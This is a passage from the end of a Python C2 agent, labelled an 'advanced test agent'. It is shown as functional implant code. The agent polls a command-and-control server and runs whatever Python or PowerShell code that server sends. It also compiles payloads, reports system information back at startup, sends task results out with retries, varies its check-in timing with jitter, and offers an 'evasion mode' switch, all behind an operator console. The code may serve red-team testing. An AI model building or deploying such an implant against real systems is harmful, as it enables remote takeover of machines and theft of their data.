                                # Save the oversized result locally
                                saved_path = self.save_oversized_result(task_id, result)
                                return {
                                    "status": "error", 
                                    "message": f"Result too large for server, saved locally to {saved_path}"
                                }
                    except:
                        pass
                    
                logger.warning(f"HTTP error {he.code} (attempt {attempt+1}/{max_retries})")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (attempt + 1))
                    
            except urllib.error.URLError as e:
                logger.warning(f"Network error (attempt {attempt+1}/{max_retries}): {e}")
                if attempt < max_retries - 1:
                    time.sleep(retry_delay * (attempt + 1))
                    
            except Exception as e:
                logger.error(f"Error sending result: {traceback.format_exc()}")
                return {"status": "error", "message": str(e)}
        
        # If we get here, all attempts failed
        # Try to save the result locally as a last resort
        saved_path = self.save_oversized_result(task_id, result)
        return {
            "status": "error", 
            "message": f"Failed to send after multiple attempts, saved locally to {saved_path}"
        }
    
    def results_sender_thread(self):
        """Thread for sending queued results"""
        logger.debug("Results sender thread started")
        
        while self.running:
            try:
                # Process any queued results
                with self.results_lock:
                    if self.results_queue:
                        # Get the oldest item
                        item = self.results_queue.pop(0)
                        # Release lock before sending
                
                if 'item' in locals():
                    # Send it
                    self.send_result(item["task_id"], item["result"])
                    # Update activity timestamp
                    self.last_activity = time.time()
                    # Clean up local variable
                    del item
                
                # Sleep before checking again
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error in results thread: {traceback.format_exc()}")
                time.sleep(5)
    
    def communications_thread(self):
        """Main communication thread"""
        logger.debug("Communications thread started")
        
        # Send initial system information
        system_info = self.collect_system_info()
        self.queue_result("init", system_info)
        
        while self.running:
            try:
                # Calculate next check interval with jitter
                interval = self._get_check_interval()
                
                # Check for tasks
                response = self.check_for_tasks()
                
                if response.get("status") == "task_available":
                    task = response.get("task", {})
                    task_id = task.get("id")
                    code = task.get("code")
                    script_type = task.get("script_type")  # Optional parameter from server
                    
                    logger.info(f"Received task {task_id}")
                    
                    # Check for special task types
                    if task.get("task_type") == "security_analysis":
                        # Run security analysis
                        result = self.run_security_analysis()
                        # Send the result or queue it depending on size
                        self.queue_result(task_id, result)
                    else:
                        # Execute regular task
                        result = self.execute_task(code, script_type)
                        # Queue the result for sending
                        self.queue_result(task_id, result)
                    
                    # Update activity timestamp
                    self.last_activity = time.time()
                
                # Sleep before checking again
                logger.debug(f"Sleeping for 1 second")
                time.sleep(1)
                
            except KeyboardInterrupt:
                self.running = False
                break
            except Exception as e:
                logger.error(f"Error in communications thread: {traceback.format_exc()}")
                time.sleep(interval)  # Still wait on error
    
    def set_evasion_mode(self, enabled=True):
        """Enable or disable evasion techniques"""
        self.evasion_mode = enabled
        logger.info(f"Evasion mode {'enabled' if enabled else 'disabled'}")
    
    def start(self):
        """Start the agent threads"""
        # Start results sender thread
        self.results_thread = threading.Thread(target=self.results_sender_thread)
        self.results_thread.daemon = True
        self.results_thread.start()
        
        # Start communications thread
        self.comms_thread = threading.Thread(target=self.communications_thread)
        self.comms_thread.daemon = True
        self.comms_thread.start()
        
        logger.info("Agent threads started")
    
    def stop(self):
        """Stop the agent gracefully"""
        logger.info("Stopping agent...")
        self.running = False
        
        # Wait for threads to terminate
        if self.comms_thread and self.comms_thread.is_alive():
            self.comms_thread.join(5)
        
        if self.results_thread and self.results_thread.is_alive():
            self.results_thread.join(5)
        
        logger.info("Agent stopped")
    
    def status(self):
        """Get agent status information"""
        elapsed = time.time() - self.last_activity
        hours, remainder = divmod(int(elapsed), 3600)
        minutes, seconds = divmod(remainder, 60)
        uptime_str = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
        
        return {
            "agent_id": self.agent_id,
            "c2_url": self.c2_url,
            "uptime": uptime_str,
            "task_count": len(self.task_history),
            "evasion_mode": self.evasion_mode,
            "pending_results": len(self.results_queue),
            "compilation_support": self.has_compilation,
            "platform": platform.system(),
        }

def interactive_mode(agent):
    """Interactive console for controlling the agent"""
    print(f"\n=== Advanced Test Agent Console ===")
    print(f"Agent ID: {agent.agent_id}")
    print(f"C2 Server: {agent.c2_url}")
    print("Type 'help' for available commands")
    
    try:
        while agent.running:
            cmd = input("\nAgent> ").strip().lower()
            
            if cmd == "help":
                print("\nAvailable commands:")
                print("  status     - Show agent status")
                print("  info       - Show system information")
                print("  history    - Show task execution history")
                print("  oversized  - View oversized results saved locally")
                print("  analyze    - Run security analysis script")
                print("  evade on   - Enable evasion techniques")
                print("  evade off  - Disable evasion techniques")
                print("  interval N - Set check interval to N seconds")
                print("  test       - Run a simple local test")
                print("  quit       - Stop agent and exit")
            
            elif cmd == "status":
                status = agent.status()
                print("\nAgent Status:")
                for key, value in status.items():
                    print(f"  {key}: {value}")
            
            elif cmd == "info":
                print("\nCollecting system information...")
                info = agent.collect_system_info()
                print("\nSystem Information:")
                for key, value in info.items():
                    print(f"  {key}: {value}")
            
            elif cmd == "history":
                if not agent.task_history:
                    print("No tasks have been executed yet")
                else:
                    for i, task in enumerate(agent.task_history):
                        print(f"\n--- Task {i+1} at {datetime.fromtimestamp(task['timestamp'])} ---")
                        if len(task["code"]) > 500:
                            print(f"{task['code'][:500]}...[truncated]")
                        else:
                            print(task["code"])
            
            elif cmd == "analyze":
                print("\nStarting security analysis... (this may take several minutes)")
                result = agent.run_security_analysis()
                if "error" in result:
                    print(f"Analysis failed: {result['error']}")
                else:
                    print(f"Analysis completed. Results sent to server task ID: {result.get('task_id')}")
            
            elif cmd == "oversized" or cmd == "oversized_results":
                results_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "oversized_results")
                if not os.path.exists(results_dir):
                    print("No oversized results directory found")
                    continue
                    
                files = [f for f in os.listdir(results_dir) if f.startswith("oversized_")]
                if not files:
                    print("No oversized results found")
                    continue
                
                print("\nOversized Results:")
                for i, file in enumerate(files):
                    print(f"  [{i+1}] {file}")
                
                selection = input("\nEnter number to view (or 'back' to return): ")
                if selection.lower() == 'back':
                    continue
                    
                try:
                    idx = int(selection) - 1
                    if 0 <= idx < len(files):
                        with open(os.path.join(results_dir, files[idx]), "r") as f:
                            result_data = json.load(f)
                            print(f"\nTask ID: {result_data['task_id']}")
                            print(f"Agent ID: {result_data['agent_id']}")
                            print(f"Timestamp: {result_data['timestamp']}")
                            
                            # Try to format the output nicely, limiting size
                            if isinstance(result_data['result'], dict):
                                # Special handling for dictionary results
                                for k, v in result_data['result'].items():
                                    print(f"\n{k}:")
                                    if isinstance(v, str) and len(v) > 500:
                                        print(f"{v[:500]}... [truncated]")
                                    else:
                                        print(v)
                            else:
                                # Generic handling
                                result_str = str(result_data['result'])
                                if len(result_str) > 1000:
                                    print(f"{result_str[:1000]}... [truncated]")
                                else:
                                    print(result_str)
                    else:
                        print("Invalid selection")
                except Exception as e:
                    print(f"Error viewing result: {e}")
            
            elif cmd == "evade on":
                agent.set_evasion_mode(True)
                print("Evasion mode enabled")
            
            elif cmd == "evade off":
                agent.set_evasion_mode(False)
                print("Evasion mode disabled")
            
            elif cmd.startswith("interval "):
                try:
                    interval = int(cmd.split(" ")[1])
                    if interval < 5:
                        print("Interval must be at least 5 seconds")
                    else:
                        agent.base_interval = interval
                        print(f"Check interval set to {interval} seconds (±{agent.jitter}s jitter)")
                except:
                    print("Invalid interval. Usage: interval <seconds>")
            
            elif cmd == "test":
                print("\nRunning local execution test...")
                test_code = """
def main():
    import platform, os
    return {
        "test": "successful",
        "platform": platform.system(),
        "python": platform.python_version(),
        "user": os.getlogin() if hasattr(os, 'getlogin') else 'unknown'
    }
"""
                print("Executing Python test:")
                result = agent._execute_python_interpreter(test_code)
                print(f"Result: {result}")
                
                if agent.has_compilation:
                    print("\nTesting compilation (this may take a moment)...")
                    try:
                        result = agent._compile_and_execute_python(test_code)
                        print(f"Compilation result: {result}")
                    except Exception as e:
                        print(f"Compilation test failed: {e}")
                else:
                    print("\nCompilation not available for testing")
                
                if platform.system() == "Windows":
                    print("\nTesting PowerShell execution:")
                    ps_code = "Write-Output 'PowerShell test successful'"
                    result = agent._execute_powershell(ps_code)
                    print(f"Result: {result}")
            
            elif cmd in ["quit", "exit"]:
                agent.stop()
                print("Agent stopped")
                break
            
            else:
                print(f"Unknown command: {cmd}")
                print("Type 'help' for available commands")
    
    except KeyboardInterrupt:
        print("\nInterrupted by user")
        agent.stop()

def main():
    """Parse arguments and start the agent"""
    parser = argparse.ArgumentParser(description="Advanced test agent with dynamic compilation")
    parser.add_argument("--server", "-s", help="C2 server URL", default="http://127.0.0.1:5000")
    parser.add_argument("--interval", "-i", type=int, help="Check interval in seconds", default=30)
    parser.add_argument("--jitter", "-j", type=int, help="Random interval jitter in seconds", default=5)
    parser.add_argument("--id", help="Custom agent ID")
    parser.add_argument("--evade", "-e", action="store_true", help="Enable evasion techniques")
    parser.add_argument("--quiet", "-q", action="store_true", help="Non-interactive mode")
    parser.add_argument("--debug", "-d", action="store_true", help="Enable debug logging")
    parser.add_argument("--pyinstaller", help="Path to PyInstaller executable")
    
    args = parser.parse_args()
    
    # Create and start agent
    agent = AdvancedTestAgent(
        c2_url=args.server,
        interval=args.interval,
        jitter=args.jitter,
        agent_id=args.id,
        pyinstaller_path=args.pyinstaller
    )
    
    # Configure logging again with agent-specific settings
    setup_logging(agent.agent_id, args.debug, args.quiet)
    
    # Enable evasion if requested
    if args.evade:
        agent.set_evasion_mode(True)
    
    # Start agent
    agent.start()
    
    try:
        if args.quiet:
            # Non-interactive mode - just wait until interrupted
            logger.info(f"Agent running in non-interactive mode. Press Ctrl+C to stop.")
            while agent.running:
                time.sleep(1)
        else:
            # Interactive mode
            interactive_mode(agent)
    except KeyboardInterrupt:
        logger.info("Interrupted by user")
    finally:
        agent.stop()

if __name__ == "__main__":
    main()
